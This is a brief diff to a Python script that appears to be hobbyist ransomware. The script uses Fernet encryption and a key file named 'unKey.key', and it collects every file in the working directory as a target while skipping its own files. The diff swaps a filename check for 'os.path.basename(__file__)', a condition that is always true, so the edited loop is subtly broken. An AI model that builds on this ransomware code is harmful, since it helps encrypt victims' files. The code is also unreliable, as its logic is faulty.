@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 files=[]
 
 for file in os.listdir():
-	if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
+	if file=="rans.py" or file=="unKey.key" or os.path.basename(__file__):
 		continue
 	if os.path.isfile(file):
 		files.append(file)
